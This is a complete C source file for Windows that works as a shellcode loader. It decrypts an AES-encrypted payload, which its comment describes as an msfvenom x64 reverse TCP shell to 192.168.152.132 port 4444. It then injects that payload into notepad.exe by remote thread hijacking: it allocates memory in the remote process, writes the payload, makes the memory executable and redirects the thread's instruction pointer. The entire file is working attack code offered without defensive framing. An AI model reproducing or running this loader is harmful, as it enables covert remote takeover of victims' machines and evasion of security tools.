#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <bcrypt.h>
#pragma comment(lib, "Bcrypt.lib")

#define NT_SUCCESS(status) (((NTSTATUS)(status)) >= 0)
#define KEYSIZE 32
#define IVSIZE 16

typedef struct _AES {
    PBYTE pPlainText;      // base address of the plain text data
    DWORD dwPlainSize;     // size of the plain text data
    PBYTE pCipherText;     // base address of the encrypted data
    DWORD dwCipherSize;    // size of it
    PBYTE pKey;            // the 32 byte key
    PBYTE pIv;             // the 16 byte iv
} AES, * PAES;

BOOL InstallAesDecryption(PAES pAes) {
    if (!pAes || !pAes->pCipherText || !pAes->pKey || !pAes->pIv || pAes->dwCipherSize == 0) {
        printf("[!] Invalid AES parameters\n");
        return FALSE;
    }

    BOOL bSTATE = TRUE;
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKeyHandle = NULL;
    ULONG cbResult = 0;
    DWORD dwBlockSize = 0;
    DWORD cbKeyObject = 0;
    PBYTE pbKeyObject = NULL;
    PBYTE pbPlainText = NULL;
    DWORD cbPlainText = 0;
    NTSTATUS STATUS = 0;

    STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptOpenAlgorithmProvider Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[1] Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[2] Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    if (dwBlockSize != 16) {
        printf("[!] Unexpected block size: %d\n", dwBlockSize);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (pbKeyObject == NULL) {
        printf("[!] HeapAlloc for key object failed\n");
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptSetProperty Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGenerateSymmetricKey Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[1] Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
    if (pbPlainText == NULL) {
        printf("[!] HeapAlloc for plaintext failed\n");
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[2] Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

_EndOfFunc:
    if (hKeyHandle) BCryptDestroyKey(hKeyHandle);
    if (hAlgorithm) BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    if (pbKeyObject) HeapFree(GetProcessHeap(), 0, pbKeyObject);
    if (pbPlainText != NULL && bSTATE) {
        pAes->pPlainText = pbPlainText;
        pAes->dwPlainSize = cbPlainText;
    }
    else if (pbPlainText) {
        HeapFree(GetProcessHeap(), 0, pbPlainText);
    }
    return bSTATE;
}

BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {
    if (!pCipherTextData || !sCipherTextSize || !pKey || !pIv || !pPlainTextData || !sPlainTextSize) return FALSE;

    AES Aes = {
        .pKey = pKey,
        .pIv = pIv,
        .pCipherText = pCipherTextData,
        .dwCipherSize = sCipherTextSize
    };

    if (!InstallAesDecryption(&Aes)) return FALSE;

    *pPlainTextData = Aes.pPlainText;
    *sPlainTextSize = Aes.dwPlainSize;
    return TRUE;
}

BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
    PROCESSENTRY32 Proc = { .dwSize = sizeof(PROCESSENTRY32) };
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    if (!Process32First(hSnapShot, &Proc)) {
        printf("[!] Process32First Failed With Error : %d \n", GetLastError());
        CloseHandle(hSnapShot);
        return FALSE;
    }

    wprintf(L"[i] Enumerating processes:\n");
    do {
        WCHAR LowerName[MAX_PATH * 2];
        ZeroMemory(LowerName, sizeof(LowerName));
        if (Proc.szExeFile) {
            wprintf(L"\t- %ls (PID: %lu)\n", Proc.szExeFile, Proc.th32ProcessID);
            if (wcsncpy_s(LowerName, MAX_PATH * 2, Proc.szExeFile, _TRUNCATE) != 0) {
                printf("[!] wcsncpy_s Failed\n");
                continue;
            }
            for (DWORD i = 0; LowerName[i]; i++)
                LowerName[i] = (WCHAR)tolower(LowerName[i]);
        }

        if (_wcsicmp(LowerName, szProcessName) == 0) {
            *dwProcessId = Proc.th32ProcessID;
            *hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, Proc.th32ProcessID);
            if (*hProcess == NULL || *hProcess == INVALID_HANDLE_VALUE) {
                printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
                CloseHandle(hSnapShot);
                return FALSE;
            }
            wprintf(L"[i] Found target process: %ls (PID: %lu)\n", Proc.szExeFile, Proc.th32ProcessID);
            break;
        }
    } while (Process32Next(hSnapShot, &Proc));

    CloseHandle(hSnapShot);
    if (*dwProcessId == 0 || *hProcess == NULL || *hProcess == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] Process %ls not found\n", szProcessName);
        return FALSE;
    }
    return TRUE;
}

BOOL GetRemoteThreadHandle(IN DWORD ProcessId, OUT DWORD* ThreadId, OUT HANDLE* hThread) {
    HANDLE hSnapShot = NULL;
    THREADENTRY32 Thr = { .dwSize = sizeof(THREADENTRY32) };
    BOOL bResult = FALSE;

    *ThreadId = 0;
    *hThread = NULL;

    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot Failed: %d\n", GetLastError());
        return FALSE;
    }

    if (!Thread32First(hSnapShot, &Thr)) {
        printf("[!] Thread32First Failed: %d\n", GetLastError());
        CloseHandle(hSnapShot);
        return FALSE;
    }

    do {
        if (Thr.th32OwnerProcessID == ProcessId) {
            *ThreadId = Thr.th32ThreadID;
            *hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID);
            if (*hThread == NULL) {
                printf("[!] OpenThread Failed: %d\n", GetLastError());
                CloseHandle(hSnapShot);
                return FALSE;
            }
            bResult = TRUE;
            break;
        }
    } while (Thread32Next(hSnapShot, &Thr));

    CloseHandle(hSnapShot);
    if (!bResult) {
        *ThreadId = 0;
        *hThread = NULL;
    }
    return bResult;
}

BOOL RemoteThreadHijack(IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
    PVOID pAddress = NULL;
    DWORD dwOldProtection = 0;
    SIZE_T sNumberOfBytesWritten = 0;
    CONTEXT ThreadCtx = { .ContextFlags = CONTEXT_FULL };

    DWORD exitCode;
    if (!GetExitCodeThread(hThread, &exitCode) || exitCode != STILL_ACTIVE) {
        printf("[!] Thread is not active (ExitCode: %lu)\n", exitCode);
        return FALSE;
    }

    printf("\n[i] Allocating memory in the remote process ...");
    pAddress = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf("[!] VirtualAllocEx Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    printf("\n\t[i] Allocated Memory at: 0x%p\n", pAddress);
    printf("\t[#] Press <Enter> to write payload ...");
    getchar();

    if (pPayload == NULL || sPayloadSize == 0) {
        printf("[!] Invalid payload or size\n");
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sPayloadSize) {
        printf("[!] WriteProcessMemory Failed: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("[i] Successfully Written %zu Bytes\n", sNumberOfBytesWritten);

    if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
        printf("[!] VirtualProtectEx Failed With Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("[+] Memory protection changed to PAGE_EXECUTE_READ\n");

    printf("\n[i] Hijacking the target thread to run our shellcode ...");

    if (SuspendThread(hThread) == (DWORD)-1) {
        printf("[!] SuspendThread Failed With Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    if (!GetThreadContext(hThread, &ThreadCtx)) {
        printf("[!] GetThreadContext Failed With Error: %d\n", GetLastError());
        ResumeThread(hThread);
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("\n[i] Original Rip: 0x%llx, New Rip: 0x%llx\n", ThreadCtx.Rip, (DWORD64)pAddress);
    ThreadCtx.Rip = (DWORD64)pAddress;
    ThreadCtx.Rsp -= 8;

    if (!SetThreadContext(hThread, &ThreadCtx)) {
        printf("[!] SetThreadContext Failed With Error: %d\n", GetLastError());
        ResumeThread(hThread);
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("\n\t[#] Press <Enter> to run ...");
    getchar();
    if (ResumeThread(hThread) == (DWORD)-1) {
        printf("[!] ResumeThread Failed With Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);

    return TRUE;
}

int main() {
    // Encrypted shellcode (msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.152.132 LPORT=4444 EXITFUNC=thread -f raw -o reverse.bin)
    unsigned char AesCipherText[] = {
        0x06, 0x50, 0x84, 0x29, 0xE4, 0x0E, 0x60, 0x18, 0x33, 0x15, 0xCA, 0xED, 0xC6, 0x50, 0x37, 0x2E,
        0x02, 0xF7, 0x8C, 0xDD, 0x9D, 0x84, 0x73, 0xA3, 0x23, 0x40, 0xF0, 0x6E, 0xFF, 0x91, 0x1F, 0x3B,
        0x2C, 0x68, 0xD6, 0xA8, 0x38, 0x13, 0xCF, 0x40, 0x3B, 0xAC, 0xE8, 0xDE, 0xFE, 0x98, 0x6E, 0x68,
        0xBF, 0x33, 0xD5, 0xE8, 0x82, 0x5D, 0x24, 0xA1, 0x75, 0x7A, 0xE8, 0xFC, 0x57, 0x66, 0xA2, 0x38,
        0x40, 0xFE, 0x95, 0x37, 0x7C, 0x43, 0x57, 0x2F, 0xE2, 0x37, 0xB8, 0x7C, 0x48, 0x67, 0xE0, 0x4D,
        0x65, 0x1F, 0x5C, 0x0A, 0xF6, 0x45, 0xBB, 0xD1, 0x70, 0xC4, 0x49, 0xBD, 0xB1, 0xC5, 0x6E, 0xE7,
        0x40, 0x68, 0x77, 0xCE, 0xEA, 0xFA, 0xF6, 0x3B, 0x1B, 0xD6, 0x36, 0xBA, 0xAC, 0x4A, 0xEF, 0xBE,
        0x73, 0x05, 0x41, 0x6F, 0xDE, 0xD0, 0x65, 0x2C, 0xCD, 0x5C, 0x2A, 0x9C, 0x8C, 0x3B, 0x31, 0x26,
        0xD3, 0xD2, 0x99, 0xD8, 0x41, 0x1E, 0xA4, 0x50, 0x2A, 0xA0, 0xB6, 0x16, 0x70, 0x8C, 0x70, 0x0F,
        0x61, 0xA7, 0x11, 0x1A, 0xDB, 0x87, 0x91, 0x2E, 0x28, 0x6D, 0x12, 0xE9, 0x56, 0xD2, 0x46, 0x80,
        0x35, 0x4A, 0x97, 0xB5, 0xA8, 0xF6, 0xE4, 0xAA, 0x26, 0xB5, 0xD4, 0xAA, 0x45, 0x33, 0x23, 0x21,
        0xEC, 0x69, 0xF5, 0x2F, 0x51, 0x00, 0x5C, 0xED, 0xD5, 0x90, 0x1B, 0x08, 0xE2, 0xBB, 0xD1, 0x1D,
        0xD2, 0x22, 0xF5, 0x72, 0xBC, 0x6B, 0xBC, 0x4E, 0x28, 0x86, 0x9A, 0xF2, 0x47, 0xC1, 0xBC, 0x61,
        0x2D, 0x55, 0xED, 0x40, 0x96, 0x67, 0x5A, 0x1D, 0xAF, 0x2A, 0xF0, 0xFC, 0x2F, 0x50, 0x03, 0xB1,
        0x2F, 0x95, 0x94, 0x1A, 0xFF, 0x04, 0xAE, 0x71, 0xF0, 0xF8, 0xD7, 0x19, 0x6B, 0xED, 0x99, 0xD9,
        0xBE, 0xF0, 0xC2, 0x88, 0x1C, 0xDC, 0xDA, 0x5E, 0xA9, 0xF0, 0x74, 0xB4, 0xF2, 0x63, 0x55, 0xDE,
        0x50, 0xA9, 0x6A, 0xA1, 0x52, 0x08, 0xF8, 0x06, 0x5E, 0x46, 0x2C, 0x1E, 0x1F, 0x24, 0xC5, 0x41,
        0x28, 0x71, 0xAF, 0x3E, 0x47, 0x9A, 0x05, 0x71, 0xE9, 0xC1, 0xA6, 0xDD, 0xAC, 0xCF, 0x24, 0xB3,
        0x45, 0xD7, 0x53, 0x67, 0x93, 0x7A, 0x91, 0x98, 0x7A, 0x2F, 0x80, 0x76, 0x53, 0x49, 0x21, 0xE8,
        0x32, 0xAE, 0xE4, 0x4D, 0xDC, 0xFA, 0xA8, 0xC8, 0xE6, 0x09, 0x44, 0x35, 0xDA, 0xCE, 0xEC, 0x6B,
        0xE3, 0x3D, 0xD6, 0xDD, 0x78, 0x30, 0xEC, 0x59, 0xDB, 0xD3, 0x90, 0x94, 0xF0, 0xFD, 0xD8, 0x0D,
        0xDD, 0x7B, 0x69, 0xE5, 0xC3, 0x76, 0x6A, 0x3D, 0x8E, 0xB0, 0x14, 0x22, 0x34, 0x90, 0x90, 0x19,
        0xD0, 0x00, 0xB2, 0x76, 0x10, 0x62, 0xF1, 0xFD, 0x94, 0x0B, 0x94, 0xF5, 0x74, 0x8E, 0xC3, 0x2B,
        0x66, 0x94, 0x3F, 0x97, 0x8A, 0x00, 0x18, 0x81, 0xC3, 0x5A, 0x36, 0xAD, 0x93, 0xBD, 0xB3, 0x74,
        0xB1, 0xD7, 0x17, 0xE7, 0x7C, 0x38, 0x95, 0x03, 0xF0, 0xC4, 0xC7, 0x7D, 0xC1, 0xC2, 0xF2, 0x91,
        0x33, 0x76, 0x14, 0x48, 0x7D, 0xC1, 0x18, 0x9D, 0x12, 0x8C, 0x03, 0x40, 0x74, 0x79, 0x48, 0x91,
        0x1F, 0x14, 0x81, 0x94, 0x65, 0x0C, 0x9D, 0xAC, 0xBC, 0xE4, 0x95, 0x44, 0xB5, 0x1A, 0x86, 0x9F,
        0x26, 0x1F, 0xA2, 0x62, 0x55, 0xEF, 0x52, 0x49, 0xE2, 0xAA, 0x72, 0x74, 0xA3, 0xFA, 0xD9, 0x6B,
        0x54, 0xCE, 0x3B, 0xD5, 0x74, 0x7F, 0xDF, 0x4E, 0xB0, 0xE8, 0x99, 0xD8, 0xDD, 0xB6, 0x62, 0x1D };


    unsigned char AesKey[] = {
            0xB5, 0xD5, 0x71, 0xD7, 0x61, 0x3F, 0x24, 0x25, 0x82, 0x01, 0xB1, 0x42, 0x1B, 0x9D, 0xE4, 0xDC,
            0xFB, 0x3D, 0x8A, 0x99, 0xF7, 0xEB, 0xD5, 0xF3, 0x77, 0x04, 0x02, 0x46, 0x34, 0xEA, 0x38, 0x27 };


    unsigned char AesIv[] = {
            0x79, 0x82, 0x6E, 0x03, 0xE6, 0x4B, 0x1D, 0x18, 0x86, 0x0E, 0x2B, 0x26, 0xF0, 0x56, 0x09, 0xAE };


    PVOID pPlainText = NULL;
    DWORD sPlainTextSize = 0;
    DWORD ThreadId = 0;
    HANDLE hThread = NULL;
    HANDLE hProcess = NULL;
    DWORD dwProcessId = 0;
    LPCWSTR TargetProcessName = L"notepad.exe";

    if (!GetRemoteProcessHandle((LPWSTR)TargetProcessName, &dwProcessId, &hProcess)) {
        wprintf(L"[!] GetRemoteProcessHandle Failed for %ls\n", TargetProcessName);
        return 1;
    }
    wprintf(L"[i] Found process %ls with PID: %lu\n", TargetProcessName, dwProcessId);

    if (!SimpleDecryption(AesCipherText, sizeof(AesCipherText), AesKey, AesIv, &pPlainText, &sPlainTextSize)) {
        printf("[!] SimpleDecryption Failed\n");
        CloseHandle(hProcess);
        return 1;
    }
    printf("[i] Decrypted payload size: %lu bytes\n", sPlainTextSize);

    if (!GetRemoteThreadHandle(dwProcessId, &ThreadId, &hThread)) {
        printf("[!] GetRemoteThreadHandle Failed\n");
        HeapFree(GetProcessHeap(), 0, pPlainText);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[i] Found thread ID: %lu\n", ThreadId);

    if (!RemoteThreadHijack(hProcess, hThread, (PBYTE)pPlainText, sPlainTextSize)) {
        printf("[!] RemoteThreadHijack Failed\n");
        CloseHandle(hThread);
        HeapFree(GetProcessHeap(), 0, pPlainText);
        CloseHandle(hProcess);
        return 1;
    }

    CloseHandle(hThread);
    HeapFree(GetProcessHeap(), 0, pPlainText);
    CloseHandle(hProcess);
    wprintf(L"[+] Thread hijacking completed successfully for %ls\n", TargetProcessName);

    return 0;
}
